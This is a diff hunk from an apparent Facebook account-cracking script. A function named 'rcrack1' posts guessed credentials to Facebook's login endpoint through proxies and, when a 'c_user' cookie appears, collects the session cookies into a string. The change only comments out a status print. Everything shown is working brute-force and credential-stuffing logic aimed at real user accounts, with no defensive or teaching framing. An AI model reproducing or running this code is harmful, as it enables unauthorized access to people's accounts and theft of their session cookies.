@@ -267,7 +267,7 @@ def rcrack1(uid,pwx,tl):
             response = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data = log_data,headers = header_freefb,proxies = proxies)
             response_text = response.text
             if response.status_code == 200:
-              print(f"\r\033[1;91m [succes] - Status code {response.status_code}")
+              #print(f"\r\033[1;91m [succes] - Status code {response.status_code}")
               log_cookies=session.cookies.get_dict().keys()
               if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
